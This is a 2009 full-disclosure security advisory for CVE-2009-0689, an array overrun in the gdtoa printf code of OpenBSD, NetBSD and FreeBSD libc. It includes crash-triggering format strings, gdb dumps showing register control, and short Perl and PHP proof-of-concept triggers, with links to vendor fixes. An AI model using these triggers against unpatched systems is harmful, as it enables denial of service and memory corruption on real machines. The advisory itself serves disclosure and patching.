@@ -1,0 +1,224 @@
+
+Date: Fri, 26 Jun 2009 15:46:07 +0200
+From: Maksymilian Arciemowicz <cxib@...urityreason.com>
+To: full-disclosure@...ts.grok.org.uk
+Subject: SecurityReason: Multiple Vendors libc/gdtoa
+	printf(3) Array Overrun
+
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+[ Multiple Vendors libc/gdtoa printf(3) Array Overrun ]
+
+Author: Maksymilian Arciemowicz
+http://SecurityReason.com
+Date:
+- - Dis.: 07.05.2009
+- - Pub.: 25.06.2009
+
+CVE: CVE-2009-0689
+Risk: High
+
+Affected Software (12.06.2009):
+- - OpenBSD 4.5
+- - NetBSD 5.0
+- - FreeBSD 7.2/6.4
+
+Original URL:
+http://securityreason.com/achievement_securityalert/63
+
+
+- --- 0.Description ---
+Week after the release of new version OpenBSD and NetBSD, our research
+team has checked a new implementation of gdtoa
+
+http://openbsd.org/45.html
+
+- ---
+A new version of the gdtoa code has been integrated, bringing better C99
+support to printf(3) and friends.
+- ---
+
+More:
+http://cvsweb.netbsd.org/bsdweb.cgi/src/lib/libc/gdtoa/
+
+- --- 1. Multiple Vendors libc/gdtoa printf(3) Array Overrun ---
+The main problem exists in new dtoa implementation.
+
+asprintf(3) will crash for asprintf(ssij, "%0.262159f",x)
+
+where x != 0
+
+the behavior is correct for 262158
+
+Let's see:
+
+(gdb) r
+Starting program: /cxib/C/check
+Program received signal SIGSEGV, Segmentation fault.
+0xbbbb79d9 in __Balloc_D2A () from /usr/lib/libc.so.12
+(gdb) bt
+#0  0xbbbb79d9 in __Balloc_D2A () from /usr/lib/libc.so.12
+#1  0xbbbab6d7 in __rv_alloc_D2A () from /usr/lib/libc.so.12
+#2  0xbbba8db5 in __dtoa () from /usr/lib/libc.so.12
+#3  0xbbba671f in __vfprintf_unlocked () from /usr/lib/libc.so.12
+#4  0xbbb882e1 in asprintf () from /usr/lib/libc.so.12
+#5  0x08048706 in main () at check.c:6
+
+Let's see src/lib/libc/gdtoa/gdtoaimp.h
+- ---gdtoaimp.h---
+...
+#define Kmax 15
+...
+- ---gdtoaimp.h---
+
+The maximum Kmax length is 15. If we give bigger value, like 17 (edi),
+program will overrun freelist array. bss will have 0x1.
+
+Correct reason (by NetBSD):
+- ---gdtoaimp.h---
+...
+#define Kmax (sizeof(size_t) << 3)
+...
+- ---gdtoaimp.h---
+
+What is wrong? This program will crash in
+- --- src/lib/libc/gdtoa/misc.c ---
+	if ( (rv = freelist[k]) !=0) {
+		freelist[k] = rv->next;
+		}
+	else {
+		x = 1 << k;
+#ifdef Omit_Private_Memory
+		rv = (Bigint *)MALLOC(sizeof(Bigint) + (x-1)*sizeof(ULong));
+#else
+		len = (sizeof(Bigint) + (x-1)*sizeof(ULong) + sizeof(double) - 1)
+			/sizeof(double);
+		if ((double *)(pmem_next - private_mem + len) <= (double *)PRIVATE_mem) {
+			rv = (Bigint*)(void *)pmem_next;
+			pmem_next += len;
+			}
+		else
+			rv = (Bigint*)MALLOC(len*sizeof(double));
+#endif
+		if (rv == NULL)
+			return NULL;
+		rv->k = k;
+		rv->maxwds = x;
+		}
+- --- src/lib/libc/gdtoa/misc.c ---
+
+here
+
+rv->k = k;
+
+or
+
+freelist[k] = rv->next;
+
+A good example to show this issue is printf(1) program.
+
+127# printf %1.262159f 1.1
+Memory fault (core dumped)
+
+127# printf %11.2109999999f
+210919999199919999199991791199.5000000000000000000000000000000001000000000001001
+
+esi = 0x12
+edi = 0x1d
+
+127# printf %11.2009999999f
+220919999199919999199991791199.5000000000000000000000000000000001000000000001001
+
+esi = 0x13
+edi = 0x1d
+
+we can manipulate esi reg.
+
+127# printf %11.2009999999f
+126768668100000000000000000000.100000000000000000000000000000000000000000000000111111111
+
+Program received signal SIGSEGV, Segmentation fault.
+__Balloc_D2A (k=29) at /usr/src/lib/libc/gdtoa/misc.c:59
+59                      freelist[k] = rv->next;
+(gdb) i r
+eax            0x20efdb04       552590084
+ecx            0x77ce2a9d       2010000029
+edx            0x0      0
+ebx            0x20eff654       552597076
+esp            0xcfbfc2b0       0xcfbfc2b0
+ebp            0xcfbfc2c8       0xcfbfc2c8
+esi            0x41414141       1094795585
+edi            0x1d     29
+eip            0xf59317 0xf59317
+eflags         0x10206  66054
+cs             0x2b     43
+ss             0x33     51
+ds             0x33     51
+es             0x33     51
+fs             0x33     51
+gs             0x33     51
+
+esi = 0x41414141
+edi = 0x1d
+
+1267686681 is value of esi reg.
+
+program will crash in
+
+freelist[k] = rv->next;
+
+Example 0:
+- --- chujwamwmuzg.pl ---
+#!/usr/local/bin/perl
+printf "%0.4194310f", 0x0.0x41414141;
+- --- chujwamwmuzg.pl ---
+
+Perl will crash with
+esi = 0x41414141
+edi = 0x15
+
+Example 1:
+127# php -r 'money_format("%0.262159n", 1.1111);'
+Memory fault (core dumped)
+
+Programs that allow you to enter/control format string, are vulnerable.
+We believe that the OpenBSD source-tree have only printf(1) and perl(1)
+affected.
+
+Functions like printf(3), strfmon(3), fprintf(3), sprintf(3),
+snprintf(3), asprintf(3), vprintf(3), vfprintf(3), vsprintf(3),
+vsnprintf(3), vasprintf(3) and others, are vulnerable (with new gdtoa impl.)
+Other languages are also affected ( printf in perl )
+
+- --- 2. Fix ---
+NetBSD fix:
+http://cvsweb.netbsd.org/bsdweb.cgi/src/lib/libc/gdtoa/gdtoaimp.h
+
+OpenBSD fix:
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gdtoa/misc.c
+
+- --- 3. Greets ---
+Christos Zoulas
+
+sp3x Infospec Chujwamwdupe p_e_a pi3
+
+- --- 4. Contact ---
+Author: SecurityReason.com [ Maksymilian Arciemowicz ]
+Email: cxib {a.t] securityreason [d0t} com
+GPG: http://securityreason.com/key/Arciemowicz.Maksymilian.gpg
+http://securityreason.com/
+http://securityreason.pl/
+
+
+-----BEGIN PGP SIGNATURE-----
+
+iEYEARECAAYFAkpE0R4ACgkQpiCeOKaYa9YYvwCg0fYitWkK3qzaVOmc2QfcJlxi
+8mcAoJbBMawOs1N7dBWT5Ge4yvuhA8ZG
+=ocve
+-----END PGP SIGNATURE-----
+
+_______________________________________________
+Full-Disclosure - We believe in it.
+Charter: http://lists.grok.org.uk/full-disclosure-charter.html
+Hosted and sponsored by Secunia - http://secunia.com/
